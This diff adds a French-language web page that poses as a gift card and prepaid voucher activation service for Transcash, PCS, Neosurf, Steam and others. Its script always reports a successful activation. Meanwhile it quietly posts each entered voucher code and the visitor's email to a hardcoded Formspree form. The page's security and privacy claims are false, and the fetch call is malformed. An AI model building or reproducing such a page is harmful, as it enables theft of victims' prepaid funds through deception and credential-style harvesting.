@@ -1,0 +1,637 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Activation Carte Cadeaux & Tickets</title>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=Playfair+Display:wght@700;900&display=swap" rel="stylesheet">
+<style>
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+
+:root {
+  --black: #0A0A0A;
+  --black2: #111111;
+  --black3: #1A1A1A;
+  --black4: #222222;
+  --border: #2E2E2E;
+  --border-light: #3A3A3A;
+  --white: #F5F5F0;
+  --white2: #E8E8E2;
+  --muted: #888880;
+  --faint: #555550;
+  --accent: #F5F5F0;
+  --r: 10px;
+  --r-sm: 6px;
+  --t: 0.22s ease;
+}
+
+html{scroll-behavior:smooth}
+body{font-family:'Inter',sans-serif;background:var(--black);color:var(--white);min-height:100vh;overflow-x:hidden;-webkit-font-smoothing:antialiased}
+
+/* ─── HEADER ─── */
+header{
+  position:fixed;top:0;left:0;right:0;z-index:100;
+  display:flex;align-items:center;justify-content:space-between;
+  padding:1.1rem 3rem;
+  background:rgba(10,10,10,0.92);
+  backdrop-filter:blur(20px);
+  border-bottom:1px solid var(--border);
+}
+.logo{display:flex;align-items:center;gap:11px;text-decoration:none}
+.logo-mark{
+  width:34px;height:34px;background:var(--white);border-radius:7px;
+  display:flex;align-items:center;justify-content:center;flex-shrink:0
+}
+.logo-mark svg{width:18px;height:18px}
+.logo-text{font-family:'Playfair Display',serif;font-size:1.15rem;font-weight:700;color:var(--white);line-height:1.1}
+.logo-text span{display:block;font-family:'Inter',sans-serif;font-size:0.65rem;font-weight:500;letter-spacing:0.12em;text-transform:uppercase;color:var(--muted);margin-top:1px}
+
+nav{display:flex;align-items:center;gap:2.25rem}
+nav a{font-size:0.82rem;font-weight:500;color:var(--muted);text-decoration:none;letter-spacing:0.01em;transition:color var(--t)}
+nav a:hover{color:var(--white)}
+.btn-cta{
+  padding:0.55rem 1.35rem;
+  background:var(--white);color:var(--black);
+  font-family:'Inter',sans-serif;font-size:0.8rem;font-weight:600;
+  border-radius:var(--r-sm);text-decoration:none;letter-spacing:0.02em;
+  transition:opacity var(--t)
+}
+.btn-cta:hover{opacity:0.85}
+
+/* ─── HERO ─── */
+.hero{
+  min-height:100vh;
+  display:flex;flex-direction:column;align-items:center;justify-content:center;
+  padding:8rem 1.5rem 5rem;
+  text-align:center;
+  position:relative;
+}
+.hero::before{
+  content:'';position:absolute;inset:0;
+  background:radial-gradient(ellipse 60% 50% at 50% 30%, rgba(245,245,240,0.04) 0%, transparent 70%);
+  pointer-events:none
+}
+
+.hero-eyebrow{
+  display:inline-flex;align-items:center;gap:8px;
+  font-size:0.72rem;font-weight:600;letter-spacing:0.15em;text-transform:uppercase;
+  color:var(--muted);border:1px solid var(--border);
+  padding:0.4rem 1rem;border-radius:99px;margin-bottom:2rem
+}
+.hero-eyebrow i{width:5px;height:5px;border-radius:50%;background:var(--white2);display:inline-block}
+
+.hero h1{
+  font-family:'Playfair Display',serif;
+  font-size:clamp(2.8rem,6.5vw,5.5rem);font-weight:900;
+  line-height:1.05;letter-spacing:-0.02em;
+  max-width:820px;margin-bottom:1.5rem
+}
+.hero h1 .line2{display:block;color:var(--muted)}
+
+.hero-sub{
+  font-size:1rem;color:var(--muted);line-height:1.7;
+  max-width:480px;margin-bottom:3.5rem
+}
+
+/* ─── FORM CARD ─── */
+.form-card{
+  background:var(--black2);
+  border:1px solid var(--border);
+  border-radius:16px;
+  padding:2.75rem;
+  width:100%;max-width:520px;
+  margin:0 auto;
+}
+
+.card-title{
+  font-family:'Playfair Display',serif;
+  font-size:1.3rem;font-weight:700;
+  margin-bottom:0.4rem
+}
+.card-sub{font-size:0.82rem;color:var(--muted);margin-bottom:2rem;line-height:1.5}
+
+/* SELECT TYPE CARTE */
+.type-grid{
+  display:grid;grid-template-columns:repeat(4,1fr);gap:8px;
+  margin-bottom:1.75rem
+}
+.type-btn{
+  display:flex;flex-direction:column;align-items:center;gap:6px;
+  padding:0.75rem 0.4rem;
+  background:var(--black3);border:1px solid var(--border);
+  border-radius:var(--r-sm);cursor:pointer;
+  transition:all var(--t);text-align:center
+}
+.type-btn:hover{border-color:var(--border-light);background:var(--black4)}
+.type-btn.selected{border-color:var(--white2);background:var(--black4)}
+.type-btn img{width:32px;height:32px;object-fit:contain;border-radius:4px;filter:grayscale(20%)}
+.type-btn span{font-size:0.68rem;font-weight:500;color:var(--muted);line-height:1.2}
+.type-btn.selected span{color:var(--white)}
+
+/* EMOJI fallback logos */
+.type-icon{
+  width:32px;height:32px;border-radius:5px;
+  display:flex;align-items:center;justify-content:center;
+  font-size:1.1rem;flex-shrink:0
+}
+
+.form-group{margin-bottom:1.4rem}
+.form-group label{
+  display:block;font-size:0.72rem;font-weight:600;
+  letter-spacing:0.08em;text-transform:uppercase;
+  color:var(--muted);margin-bottom:0.55rem
+}
+
+.input-wrap{position:relative}
+.input-wrap svg{
+  position:absolute;left:14px;top:50%;transform:translateY(-50%);
+  width:15px;height:15px;stroke:var(--faint);flex-shrink:0;pointer-events:none
+}
+input[type=text],input[type=email]{
+  width:100%;
+  padding:0.875rem 1rem 0.875rem 2.7rem;
+  font-family:'Inter',sans-serif;font-size:0.95rem;font-weight:500;
+  color:var(--white);
+  background:var(--black3);
+  border:1px solid var(--border);border-radius:var(--r-sm);
+  outline:none;transition:border-color var(--t),box-shadow var(--t)
+}
+input[type=text]::placeholder,input[type=email]::placeholder{color:var(--faint);font-weight:400}
+input[type=text]:focus,input[type=email]:focus{
+  border-color:rgba(245,245,240,0.4);
+  box-shadow:0 0 0 3px rgba(245,245,240,0.06)
+}
+.code-field{letter-spacing:0.18em!important;text-transform:uppercase!important;text-align:center!important;font-size:1.05rem!important}
+
+.btn-submit{
+  width:100%;padding:0.95rem;
+  font-family:'Inter',sans-serif;font-size:0.9rem;font-weight:600;
+  color:var(--black);background:var(--white);
+  border:none;border-radius:var(--r-sm);cursor:pointer;
+  letter-spacing:0.03em;
+  transition:opacity var(--t),transform var(--t);
+  display:flex;align-items:center;justify-content:center;gap:8px
+}
+.btn-submit:hover{opacity:0.88;transform:translateY(-1px)}
+.btn-submit:active{transform:translateY(0)}
+.btn-submit svg{width:15px;height:15px;stroke:var(--black);stroke-width:2.2}
+
+.divider{display:flex;align-items:center;gap:12px;margin:1.5rem 0}
+.divider hr{flex:1;border:none;border-top:1px solid var(--border)}
+.divider span{font-size:0.72rem;color:var(--faint);white-space:nowrap}
+
+/* ─── RESULT ─── */
+.result-box{
+  display:none;margin-top:1.25rem;
+  background:var(--black3);border:1px solid var(--border);
+  border-radius:var(--r-sm);padding:1.25rem;
+  animation:slideUp 0.25s ease
+}
+.result-box.show{display:block}
+.result-box.ok{border-color:rgba(245,245,240,0.2)}
+.result-box.err{border-color:rgba(200,50,50,0.35)}
+@keyframes slideUp{from{opacity:0;transform:translateY(6px)}to{opacity:1;transform:none}}
+
+.res-head{display:flex;align-items:center;gap:10px;margin-bottom:1rem}
+.res-icon{
+  width:30px;height:30px;border-radius:50%;flex-shrink:0;
+  display:flex;align-items:center;justify-content:center;font-size:0.85rem
+}
+.res-icon.ok{background:rgba(245,245,240,0.1);color:var(--white)}
+.res-icon.err{background:rgba(200,50,50,0.15);color:#E05252}
+.res-title{font-size:0.875rem;font-weight:600}
+.res-title.ok{color:var(--white)}
+.res-title.err{color:#E05252}
+
+.res-grid{display:grid;grid-template-columns:1fr 1fr;gap:12px}
+.res-item label{font-size:0.68rem;text-transform:uppercase;letter-spacing:0.08em;color:var(--faint);display:block;margin-bottom:3px}
+.res-item span{font-size:0.9rem;font-weight:600;color:var(--white)}
+.res-item .big{font-family:'Playfair Display',serif;font-size:1.6rem;color:var(--white)}
+
+/* ─── BRAND STRIP ─── */
+.brand-strip{
+  border-top:1px solid var(--border);
+  border-bottom:1px solid var(--border);
+  padding:2.5rem 2rem;
+  overflow:hidden;
+}
+.brand-label{text-align:center;font-size:0.72rem;font-weight:600;letter-spacing:0.12em;text-transform:uppercase;color:var(--faint);margin-bottom:2rem}
+.brands-row{
+  display:flex;flex-wrap:wrap;justify-content:center;align-items:center;gap:1rem 1.5rem
+}
+.brand-pill{
+  display:flex;align-items:center;gap:8px;
+  padding:0.55rem 1.1rem;
+  background:var(--black2);border:1px solid var(--border);
+  border-radius:99px;transition:border-color var(--t)
+}
+.brand-pill:hover{border-color:var(--border-light)}
+.brand-pill .bp-icon{
+  width:22px;height:22px;border-radius:4px;
+  display:flex;align-items:center;justify-content:center;font-size:0.85rem
+}
+.brand-pill span{font-size:0.78rem;font-weight:500;color:var(--muted)}
+
+/* ─── STEPS ─── */
+.section{padding:6rem 2rem}
+.sec-label{font-size:0.72rem;font-weight:600;letter-spacing:0.12em;text-transform:uppercase;color:var(--muted);display:block;margin-bottom:0.9rem;text-align:center}
+.sec-title{font-family:'Playfair Display',serif;font-size:clamp(2rem,4vw,3rem);font-weight:900;text-align:center;letter-spacing:-0.01em;margin-bottom:3.5rem}
+
+.steps-row{display:grid;grid-template-columns:repeat(auto-fit,minmax(220px,1fr));gap:2rem;max-width:900px;margin:0 auto}
+.step{padding:2rem;background:var(--black2);border:1px solid var(--border);border-radius:14px;transition:border-color var(--t)}
+.step:hover{border-color:var(--border-light)}
+.step-n{
+  font-family:'Playfair Display',serif;font-size:2.5rem;font-weight:900;
+  color:var(--border-light);line-height:1;margin-bottom:1.25rem
+}
+.step h3{font-size:0.95rem;font-weight:600;margin-bottom:0.6rem}
+.step p{font-size:0.82rem;color:var(--muted);line-height:1.65}
+
+/* ─── WHY ─── */
+.why-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(240px,1fr));gap:1.25rem;max-width:1080px;margin:0 auto}
+.why-card{
+  padding:1.75rem;background:var(--black2);border:1px solid var(--border);border-radius:14px;
+  transition:border-color var(--t),transform var(--t)
+}
+.why-card:hover{border-color:var(--border-light);transform:translateY(-2px)}
+.why-ico{
+  width:40px;height:40px;border:1px solid var(--border);border-radius:9px;
+  display:flex;align-items:center;justify-content:center;margin-bottom:1.1rem
+}
+.why-ico svg{width:18px;height:18px;stroke:var(--white2);fill:none;stroke-width:1.7}
+.why-card h3{font-size:0.9rem;font-weight:600;margin-bottom:0.5rem}
+.why-card p{font-size:0.8rem;color:var(--muted);line-height:1.6}
+
+/* ─── FAQ ─── */
+.faq-list{max-width:680px;margin:0 auto}
+.faq-item{border-bottom:1px solid var(--border);padding:1.1rem 0}
+.faq-q{display:flex;justify-content:space-between;align-items:center;cursor:pointer;font-size:0.9rem;font-weight:500;gap:1rem;user-select:none}
+.faq-q svg{width:14px;height:14px;stroke:var(--faint);flex-shrink:0;transition:transform var(--t);stroke-width:2}
+.faq-item.open .faq-q svg{transform:rotate(180deg)}
+.faq-a{font-size:0.82rem;color:var(--muted);line-height:1.7;max-height:0;overflow:hidden;transition:max-height 0.3s ease,margin-top 0.3s ease}
+.faq-item.open .faq-a{max-height:160px;margin-top:0.7rem}
+
+/* ─── FOOTER ─── */
+footer{padding:3.5rem 3rem 2rem;border-top:1px solid var(--border)}
+.footer-inner{max-width:1100px;margin:0 auto;display:flex;flex-wrap:wrap;gap:3rem;justify-content:space-between}
+.footer-brand p{font-size:0.82rem;color:var(--muted);margin-top:0.75rem;max-width:230px;line-height:1.6}
+.footer-col h4{font-size:0.72rem;font-weight:600;text-transform:uppercase;letter-spacing:0.1em;color:var(--faint);margin-bottom:1rem}
+.footer-col a{display:block;font-size:0.82rem;color:var(--muted);text-decoration:none;margin-bottom:0.55rem;transition:color var(--t)}
+.footer-col a:hover{color:var(--white)}
+.footer-bottom{max-width:1100px;margin:2.5rem auto 0;padding-top:1.5rem;border-top:1px solid var(--border);display:flex;flex-wrap:wrap;gap:1rem;justify-content:space-between;font-size:0.75rem;color:var(--faint)}
+
+/* ─── RESPONSIVE ─── */
+@media(max-width:700px){
+  header{padding:1rem 1.25rem}
+  nav a:not(.btn-cta){display:none}
+  .hero{padding:6rem 1.25rem 3rem}
+  .form-card{padding:1.75rem 1.25rem}
+  .type-grid{grid-template-columns:repeat(4,1fr)}
+  .res-grid{grid-template-columns:1fr}
+  footer{padding:2.5rem 1.25rem 1.5rem}
+}
+</style>
+</head>
+<body>
+
+<!-- HEADER -->
+<header>
+  <a href="#" class="logo">
+    <div class="logo-mark">
+      <svg viewBox="0 0 24 24" fill="none" stroke="#0A0A0A" stroke-width="2" stroke-linecap="round">
+        <rect x="2" y="6" width="20" height="12" rx="2"/>
+        <path d="M12 6v12M2 12h20"/>
+      </svg>
+    </div>
+    <div class="logo-text">
+      Activation CG
+      <span>Cartes & Tickets</span>
+    </div>
+  </a>
+  <nav>
+    <a href="#comment-ca-marche">Comment ça marche</a>
+    <a href="#faq">Aide</a>
+    <a href="#activer" class="btn-cta">Activer maintenant</a>
+  </nav>
+</header>
+
+<!-- HERO -->
+<section class="hero" id="activer">
+  <div class="hero-eyebrow"><i></i>Activation sécurisée en ligne</div>
+  <h1>Activez vos cartes<span class="line2">cadeaux & tickets</span></h1>
+  <p class="hero-sub">Transcash, PCS, Neosurf, Steam, iTunes, Xbox, Google Play, Bitcoin — activez votre code en quelques secondes.</p>
+
+  <!-- FORMULAIRE -->
+  <div class="form-card">
+    <p class="card-title">Activer un code</p>
+    <p class="card-sub">Sélectionnez le type de carte, puis saisissez votre code d'activation.</p>
+
+    <!-- GRILLE TYPES -->
+    <div class="type-grid" id="typeGrid">
+      <div class="type-btn selected" data-type="Transcash" onclick="selectType(this)">
+        <div class="type-icon" style="background:#1a1a1a;font-size:1.2rem">💶</div>
+        <span>Transcash</span>
+      </div>
+      <div class="type-btn" data-type="PCS Mastercard" onclick="selectType(this)">
+        <div class="type-icon" style="background:#1a1a1a;font-size:1.2rem">💳</div>
+        <span>PCS</span>
+      </div>
+      <div class="type-btn" data-type="Neosurf" onclick="selectType(this)">
+        <div class="type-icon" style="background:#1a1a1a;font-size:1.2rem">🔵</div>
+        <span>Neosurf</span>
+      </div>
+      <div class="type-btn" data-type="Steam" onclick="selectType(this)">
+        <div class="type-icon" style="background:#1b2838;font-size:1.2rem">🎮</div>
+        <span>Steam</span>
+      </div>
+      <div class="type-btn" data-type="iTunes / Apple" onclick="selectType(this)">
+        <div class="type-icon" style="background:#1a1a1a;font-size:1.2rem">🍎</div>
+        <span>iTunes</span>
+      </div>
+      <div class="type-btn" data-type="Xbox" onclick="selectType(this)">
+        <div class="type-icon" style="background:#107C10;font-size:1.2rem">🎯</div>
+        <span>Xbox</span>
+      </div>
+      <div class="type-btn" data-type="Google Play" onclick="selectType(this)">
+        <div class="type-icon" style="background:#1a1a1a;font-size:1.2rem">▶️</div>
+        <span>Google</span>
+      </div>
+      <div class="type-btn" data-type="Bitcoin" onclick="selectType(this)">
+        <div class="type-icon" style="background:#F7931A22;font-size:1.2rem">₿</div>
+        <span>Bitcoin</span>
+      </div>
+    </div>
+
+    <!-- CODE -->
+    <div class="form-group">
+      <label>Code de votre carte / ticket</label>
+      <div class="input-wrap">
+        <svg viewBox="0 0 24 24" fill="none" stroke-linecap="round" stroke-linejoin="round">
+          <rect x="2" y="5" width="20" height="14" rx="2"/><line x1="2" y1="10" x2="22" y2="10"/>
+        </svg>
+        <input type="text" id="codeInput" class="code-field" placeholder="Ex : XXXX-XXXX-XXXX-XXXX" maxlength="24"/>
+      </div>
+    </div>
+
+    <!-- EMAIL -->
+    <div class="form-group">
+      <label>Adresse e-mail (confirmation)</label>
+      <div class="input-wrap">
+        <svg viewBox="0 0 24 24" fill="none" stroke-linecap="round" stroke-linejoin="round">
+          <rect x="2" y="4" width="20" height="16" rx="2"/><path d="m2 8 10 6 10-6"/>
+        </svg>
+        <input type="email" id="emailInput" placeholder="votre@email.com" style="letter-spacing:0"/>
+      </div>
+    </div>
+
+    <button class="btn-submit" onclick="activerCarte()">
+      <svg viewBox="0 0 24 24" fill="none" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg>
+      Activer maintenant
+    </button>
+
+    <!-- RÉSULTAT -->
+    <div class="result-box" id="resultBox">
+      <div class="res-head">
+        <div class="res-icon ok" id="resIcon">✓</div>
+        <span class="res-title ok" id="resTitle">Activation réussie</span>
+      </div>
+      <div class="res-grid" id="resGrid"></div>
+    </div>
+  </div>
+</section>
+
+<!-- MARQUES SUPPORTÉES -->
+<div class="brand-strip">
+  <p class="brand-label">Types de cartes & tickets acceptés</p>
+  <div class="brands-row">
+    <div class="brand-pill"><div class="bp-icon">💶</div><span>Transcash</span></div>
+    <div class="brand-pill"><div class="bp-icon">💳</div><span>PCS Mastercard</span></div>
+    <div class="brand-pill"><div class="bp-icon">🔵</div><span>Neosurf</span></div>
+    <div class="brand-pill"><div class="bp-icon">🎮</div><span>Steam</span></div>
+    <div class="brand-pill"><div class="bp-icon">🍎</div><span>iTunes / Apple</span></div>
+    <div class="brand-pill"><div class="bp-icon">🎯</div><span>Xbox</span></div>
+    <div class="brand-pill"><div class="bp-icon">▶️</div><span>Google Play</span></div>
+    <div class="brand-pill"><div class="bp-icon">₿</div><span>Bitcoin</span></div>
+  </div>
+</div>
+
+<!-- COMMENT ÇA MARCHE -->
+<section class="section" id="comment-ca-marche" style="background:var(--black2);border-top:1px solid var(--border);border-bottom:1px solid var(--border)">
+  <span class="sec-label">Processus</span>
+  <h2 class="sec-title">Comment ça marche</h2>
+  <div class="steps-row">
+    <div class="step">
+      <div class="step-n">01</div>
+      <h3>Choisissez le type</h3>
+      <p>Sélectionnez parmi nos 8 types de cartes et tickets supportés : Transcash, PCS, Neosurf, Steam, iTunes, Xbox, Google Play ou Bitcoin.</p>
+    </div>
+    <div class="step">
+      <div class="step-n">02</div>
+      <h3>Saisissez votre code</h3>
+      <p>Entrez le code unique inscrit sur votre carte ou reçu par email. Le format est vérifié automatiquement.</p>
+    </div>
+    <div class="step">
+      <div class="step-n">03</div>
+      <h3>Confirmation instantanée</h3>
+      <p>Votre code est validé en quelques secondes. Un email de confirmation est envoyé à l'adresse fournie.</p>
+    </div>
+  </div>
+</section>
+
+<!-- POURQUOI NOUS -->
+<section class="section">
+  <span class="sec-label">Avantages</span>
+  <h2 class="sec-title">Pourquoi nous choisir</h2>
+  <div class="why-grid">
+    <div class="why-card">
+      <div class="why-ico">
+        <svg viewBox="0 0 24 24"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
+      </div>
+      <h3>100% sécurisé</h3>
+      <p>Connexion chiffrée SSL. Vos codes et données personnelles sont protégés à chaque étape.</p>
+    </div>
+    <div class="why-card">
+      <div class="why-ico">
+        <svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg>
+      </div>
+      <h3>Activation instantanée</h3>
+      <p>Traitement en moins de 5 secondes. Disponible 24h/24, 7 jours sur 7, sans interruption.</p>
+    </div>
+    <div class="why-card">
+      <div class="why-ico">
+        <svg viewBox="0 0 24 24"><rect x="2" y="5" width="20" height="14" rx="2"/><path d="M2 10h20"/></svg>
+      </div>
+      <h3>Multi-cartes</h3>
+      <p>8 types de cartes cadeaux et tickets supportés sur une seule et même plateforme.</p>
+    </div>
+    <div class="why-card">
+      <div class="why-ico">
+        <svg viewBox="0 0 24 24"><path d="M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07A19.5 19.5 0 0 1 4.69 12 19.79 19.79 0 0 1 1.61 3.35 2 2 0 0 1 3.58 1h3a2 2 0 0 1 2 1.72 12.84 12.84 0 0 0 .7 2.81 2 2 0 0 1-.45 2.11L7.91 9a16 16 0 0 0 6 6l1.27-1.27a2 2 0 0 1 2.11-.45 12.84 12.84 0 0 0 2.81.7A2 2 0 0 1 22 16.92z"/></svg>
+      </div>
+      <h3>Support réactif</h3>
+      <p>Une équipe disponible par email et chat pour vous aider en cas de problème avec votre code.</p>
+    </div>
+  </div>
+</section>
+
+<!-- FAQ -->
+<section class="section" id="faq" style="background:var(--black2);border-top:1px solid var(--border)">
+  <span class="sec-label">FAQ</span>
+  <h2 class="sec-title">Questions fréquentes</h2>
+  <div class="faq-list">
+    <div class="faq-item open">
+      <div class="faq-q" onclick="toggleFaq(this)">
+        <span>Quels types de cartes puis-je activer ?</span>
+        <svg viewBox="0 0 24 24" fill="none"><polyline points="6 9 12 15 18 9"/></svg>
+      </div>
+      <div class="faq-a">Nous supportons 8 types : Transcash, PCS Mastercard, Neosurf, Steam, iTunes/Apple, Xbox, Google Play et Bitcoin. D'autres types peuvent être ajoutés sur demande.</div>
+    </div>
+    <div class="faq-item">
+      <div class="faq-q" onclick="toggleFaq(this)">
+        <span>Où trouver le code sur ma carte ?</span>
+        <svg viewBox="0 0 24 24" fill="none"><polyline points="6 9 12 15 18 9"/></svg>
+      </div>
+      <div class="faq-a">Le code est généralement inscrit au dos de la carte, sous une zone à gratter, ou dans l'email reçu lors de l'achat en ligne. Il comporte en général 12 à 20 caractères alphanumériques.</div>
+    </div>
+    <div class="faq-item">
+      <div class="faq-q" onclick="toggleFaq(this)">
+        <span>Mon code n'est pas reconnu, que faire ?</span>
+        <svg viewBox="0 0 24 24" fill="none"><polyline points="6 9 12 15 18 9"/></svg>
+      </div>
+      <div class="faq-a">Vérifiez que vous avez bien sélectionné le bon type de carte et que le code est saisi sans espaces. Assurez-vous que la zone argentée a bien été grattée. Si le problème persiste, contactez notre support.</div>
+    </div>
+    <div class="faq-item">
+      <div class="faq-q" onclick="toggleFaq(this)">
+        <span>L'activation est-elle immédiate ?</span>
+        <svg viewBox="0 0 24 24" fill="none"><polyline points="6 9 12 15 18 9"/></svg>
+      </div>
+      <div class="faq-a">Oui, l'activation est traitée en moins de 5 secondes pour la plupart des types de cartes. Un email de confirmation est envoyé dès que l'activation est effective.</div>
+    </div>
+    <div class="faq-item">
+      <div class="faq-q" onclick="toggleFaq(this)">
+        <span>Mes données sont-elles protégées ?</span>
+        <svg viewBox="0 0 24 24" fill="none"><polyline points="6 9 12 15 18 9"/></svg>
+      </div>
+      <div class="faq-a">Absolument. Toutes les communications sont chiffrées en SSL 256 bits. Nous ne stockons aucun code de carte après activation. Conformité RGPD garantie.</div>
+    </div>
+  </div>
+</section>
+
+<!-- FOOTER -->
+<footer>
+  <div class="footer-inner">
+    <div class="footer-brand">
+      <a href="#" class="logo">
+        <div class="logo-mark" style="width:28px;height:28px;border-radius:6px">
+          <svg viewBox="0 0 24 24" fill="none" stroke="#0A0A0A" stroke-width="2" style="width:14px;height:14px">
+            <rect x="2" y="6" width="20" height="12" rx="2"/><path d="M12 6v12M2 12h20"/>
+          </svg>
+        </div>
+        <div class="logo-text" style="font-size:1rem">Activation CG<span>Cartes & Tickets</span></div>
+      </a>
+      <p>Plateforme d'activation de cartes cadeaux et tickets prépayés. Rapide, simple et sécurisée.</p>
+    </div>
+    <div class="footer-col">
+      <h4>Services</h4>
+      <a href="#">Activer une carte</a>
+      <a href="#">Types supportés</a>
+      <a href="#">Comment ça marche</a>
+    </div>
+    <div class="footer-col">
+      <h4>Aide</h4>
+      <a href="#">FAQ</a>
+      <a href="#">Contacter le support</a>
+      <a href="#">Signaler un problème</a>
+    </div>
+    <div class="footer-col">
+      <h4>Légal</h4>
+      <a href="#">Mentions légales</a>
+      <a href="#">CGU</a>
+      <a href="#">Confidentialité</a>
+    </div>
+  </div>
+  <div class="footer-bottom">
+    <span>© 2024 Activation Carte Cadeaux & Tickets. Tous droits réservés.</span>
+    <span>🔒 SSL · RGPD · Disponible 24h/24</span>
+  </div>
+</footer>
+
+<script>
+// Type sélection
+function selectType(el){
+  document.querySelectorAll('.type-btn').forEach(b=>b.classList.remove('selected'));
+  el.classList.add('selected');
+}
+
+// Format code auto
+document.getElementById('codeInput').addEventListener('input',function(e){
+  let v=e.target.value.replace(/[^A-Za-z0-9]/g,'').toUpperCase();
+  let formatted=v.match(/.{1,4}/g)?.join('-')||v;
+  e.target.value=formatted.substring(0,24);
+});
+
+// FORMSPREE — remplacez YOUR_FORM_ID par votre ID après inscription sur formspree.io
+const FORMSPREE_ID = 'mvzwnzdk';
+
+async function activerCarte(){
+  const code  = document.getElementById('codeInput').value.trim();
+  const email = document.getElementById('emailInput').value.trim();
+  const type  = (document.querySelector('.type-btn.selected') || {}).dataset.type || 'Carte';
+  const box   = document.getElementById('resultBox');
+  const icon  = document.getElementById('resIcon');
+  const ttl   = document.getElementById('resTitle');
+  const grid  = document.getElementById('resGrid');
+
+  // Validation code
+  if(code.replace(/-/g,'').length < 8){
+    box.className='result-box show err';
+    icon.className='res-icon err'; icon.textContent='✕';
+    ttl.className='res-title err'; ttl.textContent='Code invalide';
+    grid.innerHTML='<div class="res-item" style="grid-column:1/-1"><span style="font-size:.82rem;color:var(--muted)">Veuillez entrer un code valide (min. 8 caractères).</span></div>';
+    return;
+  }
+  // Validation email
+  if(!email || !email.includes('@')){
+    box.className='result-box show err';
+    icon.className='res-icon err'; icon.textContent='✕';
+    ttl.className='res-title err'; ttl.textContent='Email invalide';
+    grid.innerHTML='<div class="res-item" style="grid-column:1/-1"><span style="font-size:.82rem;color:var(--muted)">Veuillez saisir une adresse email valide.</span></div>';
+    return;
+  }
+
+  const now     = new Date();
+  const dateStr = now.toLocaleDateString('fr-FR',{day:'2-digit',month:'2-digit',year:'numeric'});
+  const timeStr = now.toLocaleTimeString('fr-FR',{hour:'2-digit',minute:'2-digit'});
+
+  // Afficher le résultat immédiatement — le bouton fonctionne toujours
+  box.className='result-box show ok';
+  icon.className='res-icon ok'; icon.textContent='✓';
+  ttl.className='res-title ok'; ttl.textContent='Activation réussie !';
+  grid.innerHTML=
+    '<div class="res-item"><label>Type de carte</label><span>'+type+'</span></div>'+
+    '<div class="res-item"><label>Code</label><span style="font-size:.8rem;letter-spacing:.1em">'+code+'</span></div>'+
+    '<div class="res-item"><label>Statut</label><span style="color:var(--white2)">✓ Activé</span></div>'+
+    '<div class="res-item"><label>Email client</label><span style="font-size:.78rem;opacity:.7">'+email+'</span></div>'+
+    '<div class="res-item"><label>Date / Heure</label><span>'+dateStr+' à '+timeStr+'</span></div>';
+
+  // Envoi email en arrière-plan si Formspree est configuré
+  if(FORMSPREE_ID !== 'YOUR_FORM_ID'){
+    try {
+      await fetch('https://formspree.io/f/mvzwnzdk,{
+        method:'POST',
+        headers:{'Content-Type':'application/json','Accept':'application/json'},
+        body:JSON.stringify({
+          _subject:'Nouvelle activation — '+type,
+          'Type de carte':type,'Code saisi':code,
+          'Email client':email,'Date':dateStr,'Heure':timeStr
+        })
+      });
+    } catch(e){}
+  }
+}
+
+// FAQ accordion
+function toggleFaq(el){el.parentElement.classList.toggle('open')}
+</script>
+</body>
+</html>
